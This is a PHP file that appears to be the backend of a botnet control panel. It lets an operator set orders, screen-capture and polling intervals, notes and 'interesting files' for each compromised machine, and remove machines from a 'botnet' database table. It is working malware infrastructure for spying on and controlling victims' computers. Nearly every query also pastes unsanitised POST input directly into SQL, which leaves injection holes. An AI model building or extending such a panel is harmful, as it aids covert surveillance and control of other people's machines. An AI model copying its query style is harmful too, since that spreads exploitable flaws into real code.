<?php
include '../connect.php';
include '../phpFunction.php';
if (isset($_POST["operation"])) {
	if ($_POST["operation"] == "updateOrder") {
		$sql    = "UPDATE botnet SET ".$_POST['type']."=".$_POST['set']." WHERE machineID='".$_POST['id']."'";
		$result = mysqli_query($conn, $sql);
	}
	elseif ($_POST["operation"] == "updateScreenCaptureInterval") {
		$sql    = "UPDATE botnet SET screenCaptureInterval=".$_POST['value']." WHERE machineID='".$_POST['id']."'";
		$result = mysqli_query($conn, $sql);
	}elseif ($_POST["operation"] == "updateOrdersInterval") {
		$sql    = "UPDATE botnet SET ordersInterval=".$_POST['value']." WHERE machineID='".$_POST['id']."'";
		$result = mysqli_query($conn, $sql);
	}elseif ($_POST["operation"] == "updateNote") {
		$sql    = "UPDATE botnet SET note='".$_POST['value']."' WHERE machineID='".$_POST['id']."'";
		$result = mysqli_query($conn, $sql);
	}elseif ($_POST["operation"] == "interestingFiles") {
		
		
		$stmt = $conn->prepare("UPDATE botnet SET interestingFiles=? WHERE machineID=?");
		$stmt->bind_param("ss", $_POST['value'], $_POST["id"]);
		$stmt->execute();
		
		
	
	}else if ($_POST["operation"] == "removeMachine") {
		$sql    = "DELETE FROM botnet WHERE machineID='".$_POST['id']."'";
		$result = mysqli_query($conn, $sql);
		$sql    = "DELETE FROM specs WHERE machineID='".$_POST['id']."'";
		$result = mysqli_query($conn, $sql);
		deleteDir("../machines/".$_POST['id'], 0700);
	}
	require('disconnect.php');
}
?>